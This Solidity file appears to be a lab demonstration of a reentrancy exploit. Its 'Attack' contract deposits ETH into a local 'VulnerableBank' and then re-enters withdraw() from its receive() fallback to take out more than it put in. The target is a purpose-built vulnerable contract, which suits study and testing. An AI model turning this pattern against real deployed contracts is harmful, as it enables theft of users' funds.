// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vulnerable.sol";

contract Attack {
    VulnerableBank public target;
    bool private attacking;
    uint256 private reentryCount;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Need some ETH");
        attacking = true;
        reentryCount = 0;

        target.deposit{value: msg.value}();

        target.withdraw(msg.value);

        attacking = false;
    }

    receive() external payable {
        if (attacking && reentryCount < 1 && address(target).balance >= msg.value) {
            reentryCount += 1;
            target.withdraw(msg.value);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

